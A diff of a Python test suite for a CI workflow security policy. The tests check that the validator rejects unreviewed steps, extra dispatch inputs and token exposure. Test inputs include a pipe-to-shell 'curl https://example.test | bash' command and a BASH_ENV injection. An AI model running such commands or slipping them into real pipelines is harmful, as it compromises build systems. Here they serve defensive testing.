@@ -194,7 +194,7 @@ class WorkflowPolicyTests(unittest.TestCase):
     def test_extra_dispatch_inputs_and_unreviewed_commands_cannot_expand_authority(self):
         d = copy.deepcopy(self.document); d["on"]["workflow_dispatch"] = {"inputs": {"branch": {"type": "string"}}}; self.reject(d)
         for step in [{"run": "gh release create r-1"}, {"run": "curl https://example.test | bash"},
-                     {"uses": "./.github/actions/local"}, {"run": "nix develop --command scripts/verify", "env": {"BASH_ENV": "evil"}}]:
+                     {"uses": "./.github/actions/local"}, {"run": "nix develop .#release-check --command scripts/verify", "env": {"BASH_ENV": "evil"}}]:
             d = copy.deepcopy(self.document); d["jobs"]["verify"]["steps"].append(step); self.reject(d)
         # Renaming/adding a workflow does not avoid the authority policy.
         self.reject(d, "new-maintenance.yml")
@@ -213,8 +213,10 @@ class WorkflowPolicyTests(unittest.TestCase):
             doc["on"] = {event: options}
             # Other workflows retain the general read-only commands, without
             # borrowing verify.yml's narrowly scoped diagnostic exceptions.
-            doc['jobs']['verify']['steps'] = doc['jobs']['verify']['steps'][:3] + [
-                {'run': 'nix develop --command scripts/verify'}]
+            steps = doc['jobs']['verify']['steps']
+            install = next(i for i, step in enumerate(steps) if step.get('uses') == policy.NIX)
+            doc['jobs']['verify']['steps'] = steps[:install + 2] + [
+                {'run': 'nix develop .#release-check --command scripts/verify'}]
             yield event, doc
 
     def test_readonly_non_dispatch_workflows_remain_valid(self):
@@ -328,7 +330,7 @@ class WorkflowPolicyTests(unittest.TestCase):
 
     def test_tokens_cannot_reach_candidate_builds_or_other_privileged_environments(self):
         d = copy.deepcopy(self.release)
-        step = next(s for s in d["jobs"]["live-verify"]["steps"] if "run" in s)
+        step = next(s for s in d["jobs"]["live-verify"]["steps"] if s.get("run", "").startswith("python3 scripts/release.py live-verify"))
         step["env"]["GH_TOKEN"] = "${{ github.token }}"; self.reject(d, "release.yml")
         d = copy.deepcopy(self.release)
         step = next(s for s in d["jobs"]["publish"]["steps"] if s.get("run") == policy.PUBLISH)
@@ -339,11 +341,11 @@ class WorkflowPolicyTests(unittest.TestCase):
         d = copy.deepcopy(self.release); d["jobs"]["advertise"]["needs"] = ["publish"]; self.reject(d, "release.yml")
         d = copy.deepcopy(self.release); del d["jobs"]["live-verify"]; self.reject(d, "release.yml")
         d = copy.deepcopy(self.release)
-        step = next(s for s in d["jobs"]["live-verify"]["steps"] if "run" in s)
+        step = next(s for s in d["jobs"]["live-verify"]["steps"] if s.get("run", "").startswith("python3 scripts/release.py live-verify"))
         step["run"] = "echo passed"; self.reject(d, "release.yml")
         live = self.release["jobs"]["live-verify"]
         self.assertEqual({row["system"] for row in live["strategy"]["matrix"]["include"]}, {"aarch64-linux", "x86_64-linux"})
-        command = next(s["run"] for s in live["steps"] if "run" in s)
+        command = next(s["run"] for s in live["steps"] if s.get("run", "").startswith("python3 scripts/release.py live-verify"))
         self.assertIn("scripts/release.py live-verify", command)
         self.assertIn("GITHUB_RUN_ATTEMPT", command)
 
